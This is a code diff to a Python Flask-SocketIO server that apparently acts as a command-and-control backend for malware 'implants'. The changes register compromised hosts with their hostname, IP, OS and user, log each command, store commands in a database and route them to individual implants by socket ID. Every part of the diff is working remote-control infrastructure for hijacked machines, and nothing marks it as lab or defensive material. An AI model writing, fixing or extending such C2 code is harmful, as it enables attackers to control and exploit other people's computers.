@@ -186,54 +186,63 @@ def handle_disconnect():
 @socketio.on('register')
 def handle_register(data):
     """Handle implant registration"""
-    implant_id = data.get('id')
-    if not implant_id:
-        return
-    
-    # Check if implant already exists
-    conn = get_db()
-    existing_implant = conn.execute('SELECT * FROM implants WHERE id = ?', (implant_id,)).fetchone()
-    
-    if existing_implant:
-        # Update existing implant
-        conn.execute('''UPDATE implants 
-                       SET hostname = ?, ip = ?, os = ?, user = ?, 
-                           check_in = ?, connected = 1
-                       WHERE id = ?''',
-                    (data.get('hostname'), data.get('ip'),
-                     data.get('os'), data.get('user'),
-                     datetime.now().isoformat(), implant_id))
-    else:
-        # Insert new implant
-        conn.execute('''INSERT INTO implants 
-                       (id, hostname, ip, os, user, check_in, connected)
-                       VALUES (?, ?, ?, ?, ?, ?, 1)''',
-                    (implant_id, data.get('hostname'), data.get('ip'),
-                     data.get('os'), data.get('user'),
-                     datetime.now().isoformat()))
-    
-    conn.commit()
-    conn.close()
-    
-    # Update active implants
-    active_implants[implant_id] = {
-        'hostname': data.get('hostname'),
-        'ip': data.get('ip'),
-        'os': data.get('os'),
-        'user': data.get('user'),
-        'connected': True,
-        'last_seen': datetime.now().isoformat(),
-        'last_activity': 'Connected',
-        'sid': request.sid  # Store socket ID
-    }
-    
-    # Initialize command queue if not exists
-    if implant_id not in command_queues:
-        command_queues[implant_id] = queue.Queue()
-    
-    # Broadcast updates
-    emit('implants_update', active_implants, broadcast=True)
-    emit('registered', {'status': 'success'})
+    try:
+        implant_id = data.get('id')
+        if not implant_id:
+            logger.error("Registration failed: No implant ID provided")
+            return
+        
+        # Check if implant already exists
+        conn = get_db()
+        existing_implant = conn.execute('SELECT * FROM implants WHERE id = ?', (implant_id,)).fetchone()
+        
+        if existing_implant:
+            # Update existing implant
+            conn.execute('''UPDATE implants 
+                           SET hostname = ?, ip = ?, os = ?, user = ?, 
+                               check_in = ?, connected = 1
+                           WHERE id = ?''',
+                        (data.get('hostname'), data.get('ip'),
+                         data.get('os'), data.get('user'),
+                         datetime.now().isoformat(), implant_id))
+        else:
+            # Insert new implant
+            conn.execute('''INSERT INTO implants 
+                           (id, hostname, ip, os, user, check_in, connected)
+                           VALUES (?, ?, ?, ?, ?, ?, 1)''',
+                        (implant_id, data.get('hostname'), data.get('ip'),
+                         data.get('os'), data.get('user'),
+                         datetime.now().isoformat()))
+        
+        conn.commit()
+        conn.close()
+        
+        # Update active implants
+        active_implants[implant_id] = {
+            'hostname': data.get('hostname'),
+            'ip': data.get('ip'),
+            'os': data.get('os'),
+            'user': data.get('user'),
+            'connected': True,
+            'last_seen': datetime.now().isoformat(),
+            'last_activity': 'Connected',
+            'sid': request.sid  # Store socket ID
+        }
+        
+        # Initialize command queue if not exists
+        if implant_id not in command_queues:
+            command_queues[implant_id] = queue.Queue()
+        
+        # Log successful registration
+        logger.info(f"Implant {implant_id} registered successfully (SID: {request.sid})")
+        
+        # Broadcast updates
+        emit('implants_update', active_implants, broadcast=True)
+        emit('registered', {'status': 'success'})
+        
+    except Exception as e:
+        logger.error(f"Error during implant registration: {e}")
+        emit('registered', {'status': 'error', 'message': str(e)})
 
 @socketio.on('command')
 def handle_command(data):
@@ -252,12 +261,30 @@ def handle_command(data):
         if not implant:
             emit('error', {'message': 'Implant not found'})
             return
+        conn.close()
         
-        # Emit command to the specific implant
-        emit('command', {
-            'command': command,
-            'implant_id': implant_id
-        }, room=implant_id)
+        # Log the command
+        logger.info(f"Sending command to implant {implant_id}: {command}")
+        
+        # Store command in database
+        conn = get_db()
+        conn.execute('INSERT INTO commands (implant_id, command, status, timestamp) VALUES (?, ?, ?, ?)',
+                    (implant_id, command, 'pending', datetime.now().isoformat()))
+        conn.commit()
+        conn.close()
+        
+        # Emit command to the specific implant using their socket ID
+        if implant_id in active_implants and 'sid' in active_implants[implant_id]:
+            implant_sid = active_implants[implant_id]['sid']
+            emit('command', {
+                'command': command,
+                'implant_id': implant_id,
+                'timestamp': datetime.now().isoformat()
+            }, room=implant_sid)
+            logger.info(f"Command emitted to implant {implant_id} (SID: {implant_sid})")
+        else:
+            logger.error(f"Implant {implant_id} not connected or missing socket ID")
+            emit('error', {'message': 'Implant not connected'})
         
     except Exception as e:
         logger.error(f"Error handling command: {e}")
